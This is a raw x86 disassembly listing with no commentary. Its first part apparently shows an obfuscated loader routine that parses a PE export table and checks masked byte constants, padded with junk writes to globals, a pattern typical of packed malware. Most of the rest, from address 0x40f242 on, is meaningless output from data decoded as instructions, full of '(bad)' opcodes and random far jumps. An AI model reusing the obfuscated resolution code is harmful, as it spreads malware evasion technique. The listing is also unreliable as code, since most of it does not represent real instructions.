  40efc5:	push   edx
  40efc6:	lods   al,BYTE PTR ds:[esi]
  40efc7:	out    dx,al
  40efc8:	gs addr16 mov ecx,0x9b69b01e
  40efcf:	imul   ecx,esp,0xffffff8d
  40efd2:	imul   BYTE PTR ds:0xf77b8c79
  40efd8:	xlat   BYTE PTR ds:[ebx]
  40efd9:	and    eax,edi
  40efdb:	movsx  di,BYTE PTR [eax+0x1]
  40efe0:	mov    ebx,0x3b50
  40efe5:	sub    di,bx
  40efe8:	mov    ebx,0x8a8c
  40efed:	xor    di,bx
  40eff0:	mov    ebx,0x4f86
  40eff5:	cmp    di,bx
  40eff8:	jne    0x40f020
  40effe:	movsx  di,BYTE PTR [eax]
  40f002:	mov    ebx,0x3b50
  40f007:	sub    di,bx
  40f00a:	mov    ebx,0x8a8c
  40f00f:	xor    di,bx
  40f012:	mov    ebx,0x4e71
  40f017:	cmp    di,bx
  40f01a:	je     0x40f030
  40f020:	mov    edi,DWORD PTR [ebp-0x10]
  40f023:	xor    edi,ecx
  40f025:	mov    ebx,esi
  40f027:	sub    ebx,edi
  40f029:	add    eax,ebx
  40f02b:	jmp    0x40efdb
  40f030:	mov    esi,DWORD PTR [ebp-0x14]
  40f033:	mov    esi,DWORD PTR [esi]
  40f035:	mov    edi,DWORD PTR [eax+0x3c]
  40f038:	lea    esi,[edi+esi*8+0x78]
  40f03c:	mov    esi,DWORD PTR [esi+eax*1]
  40f03f:	mov    DWORD PTR [ebp-0x8],esi
  40f042:	mov    esi,DWORD PTR [ebp+0x8]
  40f045:	xor    esi,ecx
  40f047:	add    esi,edx
  40f049:	mov    DWORD PTR [ebp-0x14],esi
  40f04c:	mov    esi,DWORD PTR [ebp+0x8]
  40f04f:	mov    edi,DWORD PTR [ebp-0x8]
  40f052:	xor    esi,ecx
  40f054:	add    esi,edx
  40f056:	pop    ebx
  40f057:	cmp    edi,esi
  40f059:	jne    0x40f077
  40f05f:	mov    eax,DWORD PTR [ebp+0xc]
  40f062:	xor    eax,ecx
  40f064:	mov    ecx,DWORD PTR [ebp-0x8]
  40f067:	add    eax,edx
  40f069:	imul   eax,ecx
  40f06c:	mov    DWORD PTR [ebp-0x8],eax
  40f06f:	push   DWORD PTR [ebp+0x18]
  40f072:	jmp    0x40f0cb
  40f077:	mov    ecx,DWORD PTR [ebp-0x8]
  40f07a:	add    ecx,eax
  40f07c:	mov    DWORD PTR [ebp-0x14],ecx
  40f07f:	mov    ecx,DWORD PTR [ebp-0x14]
  40f082:	mov    ecx,DWORD PTR [ecx+0xc]
  40f085:	movsx  cx,BYTE PTR [ecx+eax*1]
  40f08a:	mov    edx,0x3b50
  40f08f:	sub    cx,dx
  40f092:	mov    edx,0x8a8c
  40f097:	xor    cx,dx
  40f09a:	mov    edx,0x4e77
  40f09f:	cmp    cx,dx
  40f0a2:	jne    0x40f06f
  40f0a8:	mov    ecx,DWORD PTR ds:0x42e313
  40f0ae:	mov    ecx,DWORD PTR [ecx+0x198]
  40f0b4:	mov    DWORD PTR [ecx],eax
  40f0b6:	jmp    0x40f0dc
  40f0bb:	mov    ecx,DWORD PTR [ebp+0x18]
  40f0be:	cmp    ecx,0xf89c85b8
  40f0c4:	jne    0x40f0dc
  40f0ca:	push   eax
  40f0cb:	push   DWORD PTR [ebp+0x14]
  40f0ce:	push   DWORD PTR [ebp+0x10]
  40f0d1:	push   DWORD PTR [ebp+0xc]
  40f0d4:	push   DWORD PTR [ebp+0x8]
  40f0d7:	call   0x40c7f6
  40f0dc:	pop    edi
  40f0dd:	pop    esi
  40f0de:	leave  
  40f0df:	ret    0x14
  40f0e2:	push   ebp
  40f0e3:	mov    ebp,esp
  40f0e5:	sub    esp,0xc
  40f0e8:	xor    ecx,ecx
  40f0ea:	push   esi
  40f0eb:	mov    esi,DWORD PTR ds:0x418f55
  40f0f1:	mov    edx,DWORD PTR ds:0x418f5d
  40f0f7:	sub    edx,esi
  40f0f9:	add    esi,DWORD PTR [esi+edx*1]
  40f0fc:	mov    esi,0xf89c85b9
  40f101:	add    DWORD PTR ds:0x42c008,0x5d21
  40f10b:	mov    DWORD PTR [ebp-0x8],esi
  40f10e:	mov    DWORD PTR [ebp-0x4],0xf89c85b8
  40f115:	push   edi
  40f116:	or     edi,DWORD PTR ds:0x42a014
  40f11c:	mov    eax,eax
  40f11e:	mov    edi,DWORD PTR ds:0x42d000
  40f124:	xor    DWORD PTR ds:0x42a000,edi
  40f12a:	mov    eax,DWORD PTR [ebp-0x4]
  40f12d:	mov    edi,DWORD PTR [ebp-0x8]
  40f130:	mov    ecx,0x7510899
  40f135:	inc    DWORD PTR ds:0x429014
  40f13b:	xor    eax,ecx
  40f13d:	movzx  edx,WORD PTR ds:0x42c018
  40f144:	adc    edx,DWORD PTR ds:0x429028
  40f14a:	mov    DWORD PTR ds:0x42c018,edx
  40f150:	xor    edi,ecx
  40f152:	mov    edx,0x3272e0
  40f157:	and    DWORD PTR ds:0x429028,0x42b018
  40f161:	add    edi,edx
  40f163:	add    eax,edx
  40f165:	imul   eax,edi
  40f168:	movzx  edi,WORD PTR ds:0x42c018
  40f16f:	mov    edi,DWORD PTR [ebp+0xc]
  40f172:	cmp    edi,eax
  40f174:	mov    DWORD PTR ds:0x42d014,0x3f58
  40f17e:	je     0x4115a0
  40f184:	mov    DWORD PTR [ebp-0xc],esi
  40f187:	sub    esi,eax
  40f189:	mov    eax,DWORD PTR [ebp-0xc]
  40f18c:	xor    esi,esi
  40f18e:	add    esi,DWORD PTR ds:0x42d01c
  40f194:	adc    DWORD PTR ds:0x42c008,esi
  40f19a:	mov    esi,DWORD PTR [ebp+0xc]
  40f19d:	xor    eax,ecx
  40f19f:	add    DWORD PTR ds:0x42a014,0x1458
  40f1a9:	lea    eax,[eax*8+0x1939778]
  40f1b0:	xor    DWORD PTR ds:0x429008,0x1867
  40f1ba:	mov    eax,DWORD PTR [esi+eax*1]
  40f1bd:	or     esi,DWORD PTR ds:0x429020
  40f1c3:	mov    DWORD PTR [ebp+0xc],eax
  40f1c6:	mov    eax,DWORD PTR [ebp-0x4]
  40f1c9:	mov    DWORD PTR ds:0x42a004,0x19
  40f1d3:	cmp    DWORD PTR ds:0x42a004,0x0
  40f1da:	je     0x40f224
  40f1e0:	cmp    DWORD PTR ds:0x42a004,0x6
  40f1e7:	jne    0x40f1f8
  40f1ed:	push   0x42e000
  40f1f2:	call   DWORD PTR ds:0x42ecab
  40f1f8:	cmp    DWORD PTR ds:0x42a004,0x7
  40f1ff:	jne    0x40f212
  40f205:	mov    esi,DWORD PTR ds:0x42a004
  40f20b:	dec    esi
  40f20c:	mov    DWORD PTR ds:0x42a004,esi
  40f212:	mov    esi,DWORD PTR ds:0x42a004
  40f218:	dec    esi
  40f219:	mov    DWORD PTR ds:0x42a004,esi
  40f21f:	jmp    0x40f1d3
  40f224:	mov    esi,DWORD PTR [ebp-0x8]
  40f227:	xor    eax,ecx
  40f229:	xor    esi,ecx
  40f22b:	add    esi,edx
  40f22d:	add    eax,edx
  40f22f:	imul   eax,esi
  40f232:	mov    esi,DWORD PTR [ebp+0xc]
  40f235:	cmp    esi,eax
  40f237:	je     0x4115a0
  40f23d:	jmp    0x411585
  40f242:	xor    DWORD PTR [ebx+0x7483b0d9],ebx
  40f248:	aaa    
  40f249:	fwait
  40f24a:	mov    eax,0xd05ef52d
  40f24f:	dec    DWORD PTR [edi]
  40f251:	jmp    0x5f47:0x7a7ac945
  40f258:	jp     0x40f2d4
  40f25a:	stos   BYTE PTR es:[edi],al
  40f25b:	in     al,0xa3
  40f25d:	(bad)  
  40f25e:	iret   
  40f25f:	sbb    ebx,DWORD PTR [ecx]
  40f261:	xlat   BYTE PTR ds:[ebx]
  40f262:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f263:	repz rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f266:	pop    ebx
  40f267:	xlat   BYTE PTR ds:[ebx]
  40f268:	retf   
  40f269:	imul   esi,DWORD PTR [eax+0x24a8e05c],0xffffffc6
  40f270:	xchg   edx,eax
  40f271:	test   DWORD PTR [ecx+0x1f1e8159],0x11348778
  40f27b:	repnz add cl,ah
  40f27e:	ja     0x40f270
  40f280:	inc    ebx
  40f281:	push   es
  40f282:	cmp    al,0x5b
  40f284:	cwde   
  40f285:	sub    dl,BYTE PTR [ecx+0x71]
  40f288:	jne    0x40f2d3
  40f28a:	xchg   esp,eax
  40f28b:	pop    ds
  40f28c:	mov    esp,0xbbf01a16
  40f291:	sub    al,0x84
  40f293:	inc    ebx
  40f294:	and    eax,0x3731b422
  40f299:	out    0x5,eax
  40f29b:	and    BYTE PTR [ecx+eax*4-0x27],dh
  40f29f:	mov    eax,0x36a81091
  40f2a4:	push   esp
  40f2a5:	fcomi  st,st(6)
  40f2a7:	cmc    
  40f2a8:	popa   
  40f2a9:	shl    BYTE PTR [edi-0x15],cl
  40f2ac:	(bad)  
  40f2ad:	call   0x78f:0xc1e86243
  40f2b4:	mov    bl,0xae
  40f2b6:	aaa    
  40f2b7:	sti    
  40f2b8:	mov    ch,BYTE PTR [esi+0x3e]
  40f2bb:	mov    eax,0xf29f3084
  40f2c0:	fidiv  DWORD PTR [esi]
  40f2c2:	and    eax,0x31ab594c
  40f2c7:	jp     0x40f260
  40f2c9:	or     al,0xf3
  40f2cb:	fstp   st(6)
  40f2cd:	sub    edi,eax
  40f2cf:	xchg   ecx,eax
  40f2d0:	fild   DWORD PTR [edi+0x6b301f47]
  40f2d6:	(bad)  
  40f2d8:	pop    edi
  40f2d9:	fisttp QWORD PTR ds:0xf731549c
  40f2df:	mov    WORD PTR [edx-0x75],ds
  40f2e2:	les    edx,FWORD PTR [esi+0x5c]
  40f2e5:	mov    edi,0xd0af5b48
  40f2ea:	int    0x80
  40f2ec:	adc    eax,0x4b682812
  40f2f1:	cmp    DWORD PTR [edi-0x541c21f5],esp
  40f2f7:	jmp    0x40f2e5
  40f2f9:	std    
  40f2fa:	add    al,BYTE PTR [ebp-0x5a1ceb6e]
  40f300:	jp     0x40f288
  40f302:	scas   eax,DWORD PTR es:[edi]
  40f303:	cmp    bh,cl
  40f305:	push   es
  40f306:	call   0x89853a1c
  40f30b:	repz fdiv QWORD PTR fs:[ebx-0x18]
  40f310:	sbb    al,0x7
  40f312:	pop    ebp
  40f313:	jbe    0x40f334
  40f315:	dec    ebp
  40f316:	sub    edi,DWORD PTR [ebp+0x7bfb5184]
  40f31c:	sahf   
  40f31d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f31e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f31f:	inc    esi
  40f320:	data16 (bad) [ecx+0x738814e2]
  40f327:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f328:	outs   dx,BYTE PTR ds:[esi]
  40f329:	xchg   edi,eax
  40f32a:	lahf   
  40f32b:	scas   al,BYTE PTR es:[edi]
  40f32c:	jbe    0x40f30d
  40f32e:	outs   dx,BYTE PTR ds:[esi]
  40f32f:	(bad)  
  40f330:	sub    cl,BYTE PTR [ebx-0x43]
  40f333:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f334:	xor    DWORD PTR [eax],eax
  40f336:	xchg   ecx,eax
  40f337:	test   DWORD PTR [ecx+eiz*2+0x8],esp
  40f33b:	mov    ebp,gs
  40f33d:	jns    0x40f2cc
  40f33f:	repz or eax,0x578971e7
  40f345:	je     0x40f3bc
  40f347:	fstp   TBYTE PTR ds:0x75d144f3
  40f34d:	jnp    0x40f396
  40f34f:	fcom   st(7)
  40f351:	hlt    
  40f352:	lods   al,BYTE PTR ds:[esi]
  40f353:	in     al,dx
  40f354:	sub    eax,esp
  40f356:	repz add BYTE PTR [edx],0xbf
  40f35a:	or     BYTE PTR [edi-0xc],dh
  40f35d:	nop
  40f35e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f35f:	add    edx,DWORD PTR [ecx+ecx*8]
  40f362:	ins    DWORD PTR es:[edi],dx
  40f363:	inc    edx
  40f364:	in     eax,0x91
  40f366:	test   DWORD PTR [edi-0x45],edx
  40f369:	inc    ch
  40f36b:	dec    eax
  40f36c:	jb     0x40f328
  40f36e:	sbb    ah,0x33
  40f371:	push   ebp
  40f372:	or     BYTE PTR [esi+edi*8+0x65ed2bff],dl
  40f379:	jge    0x40f3bd
  40f37b:	leave  
  40f37c:	cwde   
  40f37d:	clc    
  40f37e:	mov    ch,0x1c
  40f380:	(bad)  
  40f381:	test   DWORD PTR [ecx+0x61d17861],0xde64fb3c
  40f38b:	pop    esp
  40f38c:	jo     0x40f3e5
  40f38e:	adc    DWORD PTR [esi+0x46e0bd72],esp
  40f394:	(bad)  
  40f395:	dec    ecx
  40f396:	jmp    0x40f330
  40f398:	add    esi,eax
  40f39a:	inc    edi
  40f39b:	mov    bl,0x71
  40f39d:	inc    eax
  40f39e:	fninit 
  40f3a0:	sub    BYTE PTR [ecx+ebp*1+0x5ac42440],bh
  40f3a7:	jne    0x40f40c
  40f3a9:	push   cs
  40f3aa:	mov    al,ds:0xa6d53683
  40f3af:	pop    ebp
  40f3b0:	inc    ebx
  40f3b1:	adc    al,0xc6
  40f3b3:	nop
  40f3b4:	loope  0x40f338
  40f3b6:	leave  
  40f3b7:	lods   al,BYTE PTR ds:[esi]
  40f3b8:	call   0x68c1:0x5da670de
  40f3bf:	stos   DWORD PTR es:[edi],eax
  40f3c0:	push   eax
  40f3c1:	push   ss
  40f3c2:	or     al,0xf4
  40f3c4:	outs   dx,DWORD PTR ds:[esi]
  40f3c5:	das    
  40f3c6:	scas   al,BYTE PTR es:[edi]
  40f3c7:	fdivr  st,st(5)
  40f3c9:	in     eax,dx
  40f3ca:	and    BYTE PTR [ecx+0x1426edd0],0xda
  40f3d1:	adc    al,0xdc
  40f3d3:	sahf   
  40f3d4:	adc    BYTE PTR [eax+0x7f],bh
  40f3d7:	dec    ebx
  40f3d8:	enter  0x1a4b,0x25
  40f3dc:	dec    ebx
  40f3dd:	add    al,BYTE PTR [esi+0x34886f81]
  40f3e3:	xchg   esp,eax
  40f3e4:	aad    0x28
  40f3e6:	xchg   edi,eax
  40f3e7:	sahf   
  40f3e8:	(bad)  
  40f3ea:	or     edi,DWORD PTR [esp+eiz*2+0x4f]
  40f3ee:	sub    ah,BYTE PTR [ebp+0x34]
  40f3f1:	fst    DWORD PTR [ebp-0x270f8b5a]
  40f3f7:	cmp    al,0xec
  40f3f9:	pop    eax
  40f3fa:	shl    BYTE PTR [esi+0x618603e6],1
  40f400:	pusha  
  40f401:	add    cl,BYTE PTR [ebx-0x71ef51e1]
  40f407:	xor    bh,BYTE PTR [ecx+0x43850548]
  40f40d:	std    
  40f40e:	pop    esi
  40f40f:	push   ds
  40f410:	xchg   esi,eax
  40f411:	in     al,dx
  40f412:	out    0xb2,eax
  40f414:	popa   
  40f415:	cmp    ebx,0xffffffc6
  40f418:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f419:	test   cl,al
  40f41b:	hlt    
  40f41c:	stos   DWORD PTR es:[edi],eax
  40f41d:	pop    esi
  40f41e:	adc    esi,eax
  40f420:	imul   esp,DWORD PTR [edi+ebp*1-0x58],0xffffffce
  40f425:	aad    0xa5
  40f427:	adc    BYTE PTR [edx],dl
  40f429:	imul   esp,esi,0x43333220
  40f42f:	jmp    0x6bf7:0x57577803
  40f436:	jne    0x40f425
  40f438:	cli    
  40f439:	inc    edi
  40f43a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f43b:	mov    ch,0x27
  40f43d:	call   0x2a5750f8
  40f442:	sub    al,0x87
  40f444:	sbb    edx,DWORD PTR [ecx-0x72]
  40f447:	ret    0x8889
  40f44a:	ficom  DWORD PTR [ecx]
  40f44c:	sub    bh,BYTE PTR [esi+ebp*1]
  40f44f:	gs and eax,0x3456e1fb
  40f455:	pop    es
  40f456:	iret   
  40f457:	stos   BYTE PTR es:[edi],al
  40f458:	fadd   QWORD PTR [ebx+esi*1-0x12]
  40f45c:	lods   al,BYTE PTR ds:[esi]
  40f45d:	les    esp,FWORD PTR [esi]
  40f45f:	sub    ch,cl
  40f461:	cmp    DWORD PTR [ecx],esi
  40f463:	ror    BYTE PTR [ebx+0x44],1
  40f466:	inc    esi
  40f467:	lock test BYTE PTR [ecx-0x1b],al
  40f46b:	sbb    BYTE PTR [ebx+0x6c],dl
  40f46e:	dec    ebx
  40f46f:	sub    ch,al
  40f471:	gs rol dh,cl
  40f474:	xor    dh,BYTE PTR [ebx]
  40f476:	xor    BYTE PTR [ebp-0x3c],cl
  40f479:	icebp  
  40f47a:	jmp    0x73a1ee64
  40f47f:	mov    bh,0x67
  40f481:	xchg   esi,eax
  40f482:	cld    
  40f483:	outs   dx,BYTE PTR ss:[esi]
  40f485:	or     DWORD PTR [edx+ebx*4],esp
  40f488:	out    0x7,al
  40f48a:	inc    ebp
  40f48b:	aaa    
  40f48c:	adc    ecx,esp
  40f48e:	and    al,0x4b
  40f490:	fdivrp st(6),st
  40f492:	or     BYTE PTR [ebx],0x54
  40f495:	ror    BYTE PTR [ecx],0x69
  40f498:	xor    BYTE PTR [edx+0x3a],bh
  40f49b:	jmp    0xc871:0x5882cdb2
  40f4a2:	enter  0xb283,0xc3
  40f4a6:	adc    eax,0xb2f4475f
  40f4ab:	inc    edx
  40f4ac:	inc    ebp
  40f4ad:	pop    edi
  40f4ae:	fcmovnb st,st(6)
  40f4b0:	xchg   esi,eax
  40f4b1:	push   0x7c111656
  40f4b6:	mov    ebx,0x77b0b685
  40f4bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f4bc:	and    BYTE PTR [esi-0x41b6fcca],cl
  40f4c2:	ja     0x40f4c4
  40f4c4:	mov    eax,ds:0x8a8a0a66
  40f4c9:	mov    dl,0x72
  40f4cb:	cmp    eax,DWORD PTR [edi]
  40f4cd:	ror    DWORD PTR [ecx],cl
  40f4cf:	push   edi
  40f4d0:	push   ebp
  40f4d1:	adc    esp,DWORD PTR [eax]
  40f4d3:	int3   
  40f4d4:	pop    ecx
  40f4d5:	sbb    al,0x99
  40f4d7:	inc    BYTE PTR [esp+eiz*8-0x577ec7bf]
  40f4de:	inc    ebx
  40f4df:	enter  0x922c,0xf4
  40f4e3:	popa   
  40f4e4:	mov    al,0xab
  40f4e6:	sbb    dh,ah
  40f4e8:	cmp    BYTE PTR [eax+0x28],cl
  40f4eb:	cmp    BYTE PTR [eax-0x46b4e08c],dl
  40f4f1:	mov    dl,BYTE PTR [edx+0x38]
  40f4f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f4f5:	lods   al,BYTE PTR ds:[esi]
  40f4f6:	jae    0x40f495
  40f4f8:	hlt    
  40f4f9:	cmp    eax,0x45e04648
  40f4fe:	pop    esp
  40f4ff:	into   
  40f500:	shl    DWORD PTR [edx],1
  40f502:	xor    DWORD PTR [edx],ebx
  40f504:	rcl    DWORD PTR [ecx+0x78],cl
  40f507:	mov    al,0xa4
  40f509:	adc    di,WORD PTR [eax]
  40f50c:	(bad)  
  40f50d:	outs   dx,BYTE PTR ds:[esi]
  40f50e:	mov    cl,0xd2
  40f510:	mov    esp,0x3c366f50
  40f515:	push   ecx
  40f516:	hlt    
  40f517:	adc    BYTE PTR [edi+0x7d539508],0x1f
  40f51e:	aad    0x48
  40f520:	call   0x27ee:0x5b113c85
  40f527:	(bad)  
  40f528:	mov    cl,0x4d
  40f52a:	lahf   
  40f52b:	xor    al,0x8c
  40f52d:	outs   dx,DWORD PTR ds:[esi]
  40f52e:	and    DWORD PTR ds:0x702cb295,0x26
  40f535:	push   es
  40f536:	pop    ds
  40f537:	loop   0x40f56b
  40f539:	add    al,0xd8
  40f53b:	mov    dh,0x3c
  40f53d:	or     eax,0x8eff0dad
  40f542:	loopne 0x40f554
  40f544:	dec    ebx
  40f545:	dec    ecx
  40f546:	ja     0x40f592
  40f548:	xor    BYTE PTR [ebx-0x43],cl
  40f54b:	hlt    
  40f54c:	dec    esp
  40f54d:	jo     0x40f593
  40f54f:	or     edx,ebp
  40f551:	enter  0xbd1b,0xaf
  40f555:	lods   eax,DWORD PTR ds:[esi]
  40f556:	and    eax,0x45457137
  40f55b:	inc    eax
  40f55c:	mov    cl,0xc
  40f55e:	inc    ecx
  40f55f:	adc    ebx,DWORD PTR [ecx-0x40]
  40f562:	pop    edx
  40f563:	inc    eax
  40f564:	push   esi
  40f565:	pop    es
  40f566:	adc    bh,BYTE PTR [edx-0x3b88a280]
  40f56c:	pop    esi
  40f56d:	mov    bh,0xb5
  40f56f:	(bad)  
  40f570:	push   cs
  40f571:	jmp    0xa4a33d9
  40f576:	pop    ebx
  40f577:	inc    edx
  40f578:	mov    ch,0x62
  40f57a:	add    al,0xe5
  40f57c:	ja     0x40f510
  40f57e:	cmp    DWORD PTR [edi+ebp*8],0x4ec3bc2
  40f585:	dec    esi
  40f586:	jecxz  0x40f5d8
  40f588:	ja     0x40f522
  40f58a:	out    0x14,al
  40f58c:	fild   WORD PTR [esi+0x67419988]
  40f592:	xchg   ecx,eax
  40f593:	(bad)  
  40f594:	loop   0x40f5bd
  40f596:	or     al,0x99
  40f598:	(bad)  
  40f59a:	retf   0x5562
  40f59d:	jmp    0x49a2f437
  40f5a2:	jp     0x40f55e
  40f5a4:	push   edx
  40f5a5:	and    esi,ebx
  40f5a7:	pop    ecx
  40f5a8:	fcomp  DWORD PTR [esi+0x18f05fde]
  40f5ae:	test   DWORD PTR [ecx],ecx
  40f5b0:	fidiv  WORD PTR [esi+0x40]
  40f5b3:	fwait
  40f5b4:	(bad)  
  40f5b5:	pop    esi
  40f5b6:	sub    DWORD PTR [ebp+0x7b2c1731],0xba371382
  40f5c0:	xor    eax,0xa5913019
  40f5c5:	or     edx,edi
  40f5c7:	sbb    BYTE PTR [edi],al
  40f5c9:	leave  
  40f5ca:	push   edx
  40f5cb:	push   esp
  40f5cc:	cmp    edx,DWORD PTR [esp+0x6ef7cb9e]
  40f5d3:	mov    dh,BYTE PTR ss:[eax-0x23be6a83]
  40f5da:	jmp    0xd0379221
  40f5df:	sub    DWORD PTR [ecx],0xffffffeb
  40f5e2:	push   ebp
  40f5e3:	scas   eax,DWORD PTR es:[edi]
  40f5e4:	mov    ebp,0x523c934a
  40f5e9:	mov    bl,0x85
  40f5eb:	xlat   BYTE PTR ds:[ebx]
  40f5ec:	or     ah,BYTE PTR [ecx+ecx*1]
  40f5ef:	push   ecx
  40f5f0:	sbb    eax,0xed5f8dae
  40f5f5:	les    esi,FWORD PTR [ebx+esi*1+0x1]
  40f5f9:	das    
  40f5fa:	jo     0x40f5fc
  40f5fc:	stc    
  40f5fd:	xchg   ecx,eax
  40f5fe:	gs xchg ecx,eax
  40f600:	jmp    0x40f599
  40f602:	in     eax,0x11
  40f604:	sub    dl,BYTE PTR [esi]
  40f606:	rcl    DWORD PTR [esi-0x19],cl
  40f609:	daa    
  40f60a:	repnz dec edi
  40f60c:	(bad)  
  40f60d:	fwait
  40f60e:	mov    dl,0x1c
  40f610:	out    0x3f,eax
  40f612:	jae    0x40f5c8
  40f614:	xor    bl,BYTE PTR [ebx-0xf1b808c]
  40f61a:	jmp    0x2948:0x48d36236
  40f621:	push   ebp
  40f622:	inc    eax
  40f623:	js     0x40f6a3
  40f625:	call   0xcdc6:0x62ba5861
  40f62c:	neg    BYTE PTR [eax+0x10756791]
  40f632:	ja     0x40f645
  40f634:	mov    al,0x9f
  40f636:	iret   
  40f637:	hlt    
  40f638:	cmp    ebx,DWORD PTR [esi-0x240c198e]
  40f63e:	mov    cl,BYTE PTR [ecx]
  40f640:	into   
  40f641:	gs dec esp
  40f643:	and    al,0x3d
  40f645:	jmp    0x596a:0xb1c001c4
  40f64c:	and    BYTE PTR [esi+0x6a],dl
  40f64f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f650:	dec    ebx
  40f651:	retf   
  40f652:	or     eax,0xbefb2e93
  40f657:	sbb    BYTE PTR fs:[edi+0x32],al
  40f65b:	stos   BYTE PTR es:[edi],al
  40f65c:	loopne 0x40f6a7
  40f65e:	pop    eax
  40f65f:	fcomp  st(6)
  40f661:	gs xchg esp,eax
  40f663:	lods   al,BYTE PTR ds:[esi]
  40f664:	loope  0x40f626
  40f666:	int3   
  40f667:	pop    ebp
  40f668:	xor    ebp,DWORD PTR [edx+0x2f]
  40f66b:	add    al,0x7d
  40f66d:	clc    
  40f66e:	cmp    esi,DWORD PTR [eax-0x6f093568]
  40f674:	push   ebp
  40f675:	push   0xa6794aca
  40f67a:	ins    DWORD PTR es:[edi],dx
  40f67b:	leave  
  40f67c:	aaa    
  40f67d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f67e:	inc    edi
  40f67f:	sub    eax,0xc63b9279
  40f684:	sahf   
  40f685:	xchg   ebp,eax
  40f686:	cmp    edi,DWORD PTR [edi]
  40f688:	imul   edx,eax,0xb4e78817
  40f68e:	adc    al,0x14
  40f690:	hlt    
  40f691:	jecxz  0x40f6e6
  40f693:	inc    esi
  40f694:	xchg   ebp,eax
  40f695:	shl    dh,0xe9
  40f698:	xchg   ebp,eax
  40f699:	test   eax,ebx
  40f69b:	out    0x80,eax
  40f69d:	ror    DWORD PTR [eax],0xda
  40f6a0:	push   ds
  40f6a1:	xor    BYTE PTR [edx+0x73],ch
  40f6a4:	pusha  
  40f6a5:	ret    0x7c6a
  40f6a8:	int3   
  40f6a9:	xchg   ebp,eax
  40f6aa:	add    eax,0x86b7801a
  40f6af:	pop    esi
  40f6b0:	leave  
  40f6b1:	pop    esi
  40f6b2:	(bad)  
  40f6b3:	std    
  40f6b4:	adc    ebp,DWORD PTR [esi]
  40f6b6:	in     eax,dx
  40f6b7:	in     al,0x82
  40f6b9:	int    0x93
  40f6bb:	sti    
  40f6bc:	mov    esi,0xe82e8b4a
  40f6c1:	dec    edx
  40f6c2:	ins    BYTE PTR es:[edi],dx
  40f6c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6c4:	jmp    0x40f6e2
  40f6c6:	jnp    0x40f676
  40f6c8:	nop
  40f6c9:	jns    0x40f64d
  40f6cb:	inc    edi
  40f6cc:	mov    ecx,ecx
  40f6ce:	fcom   QWORD PTR [edx]
  40f6d0:	jle    0x40f6e2
  40f6d2:	add    BYTE PTR [ebx],ch
  40f6d4:	adc    eax,0x6180d1ca
  40f6d9:	ja     0x40f75a
  40f6db:	xchg   ebx,eax
  40f6dc:	jb     0x40f69b
  40f6de:	jb     0x40f749
  40f6e0:	pop    es
  40f6e1:	mov    ch,0x56
  40f6e3:	xchg   BYTE PTR [ebx-0x1d],cl
  40f6e6:	or     al,0xd3
  40f6e8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6e9:	inc    ecx
  40f6ea:	(bad)  
  40f6eb:	retf   
  40f6ec:	jbe    0x40f6a8
  40f6ee:	aaa    
  40f6ef:	popf   
  40f6f0:	rol    DWORD PTR [ebx],0x75
  40f6f3:	das    
  40f6f4:	loop   0x40f74d
  40f6f6:	pop    ebp
  40f6f7:	mov    ah,0xd5
  40f6f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f6fa:	in     eax,0x65
  40f6fc:	pop    ss
  40f6fd:	shl    BYTE PTR [edx+0xd1fc8de],1
  40f703:	out    dx,al
  40f704:	arpl   WORD PTR [ebx],dx
  40f706:	fs pop ss
  40f708:	ret    
  40f709:	mov    DWORD PTR [edi-0x4cd1417e],esi
  40f70f:	lea    edx,[edx+0x45f46c53]
  40f715:	cmp    al,0xab
  40f717:	sbb    bl,BYTE PTR [edx-0x67]
  40f71a:	cmp    al,0xfc
  40f71c:	les    ecx,FWORD PTR [ebx]
  40f71e:	stc    
  40f71f:	neg    BYTE PTR [eax+0xd652800]
  40f725:	dec    edi
  40f726:	add    al,ch
  40f728:	lods   eax,DWORD PTR ds:[esi]
  40f729:	sbb    esp,DWORD PTR [esi-0x410cf358]
  40f72f:	mov    ah,0xd7
  40f731:	sub    eax,0x93df0a05
  40f736:	fist   WORD PTR [edi+0x46917f6c]
  40f73c:	xor    esp,DWORD PTR [edi-0x597eb251]
  40f742:	xchg   esp,eax
  40f743:	cmp    ebp,DWORD PTR [eax+eiz*2-0xe]
  40f747:	int    0x96
  40f749:	imul   edi
  40f74b:	mov    dl,0x1a
  40f74d:	(bad)
  40f751:	cmp    al,0xc9
  40f753:	xchg   esp,eax
  40f754:	adc    DWORD PTR [ebx],esi
  40f756:	loop   0x40f706
  40f758:	push   edi
  40f759:	mov    edx,0xafe5156
  40f75e:	imul   edx,esi,0xffffffff
  40f761:	ins    DWORD PTR es:[edi],dx
  40f762:	scas   eax,DWORD PTR es:[edi]
  40f763:	outs   dx,DWORD PTR ds:[esi]
  40f764:	xchg   edi,eax
  40f765:	call   0x85dd4e05
  40f76a:	clc    
  40f76b:	mov    ch,0x24
  40f76d:	cmp    esp,DWORD PTR [eax-0xdeaad16]
  40f773:	or     esi,DWORD PTR [esi+0x46bd1a80]
  40f779:	and    eax,0x3f35a028
  40f77e:	repz sti 
  40f780:	test   BYTE PTR [ebp+0x35934442],0x79
  40f787:	leave  
  40f788:	push   cs
  40f789:	push   edi
  40f78a:	mov    DWORD PTR [ecx+0x5aae452a],0x32b31730
  40f794:	aam    0xb8
  40f796:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f797:	addr16 adc al,0x36
  40f79a:	cmp    ebp,DWORD PTR [eax+ebp*8+0x65]
  40f79e:	in     eax,dx
  40f79f:	sub    al,0x80
  40f7a1:	pushf  
  40f7a2:	sub    al,0x96
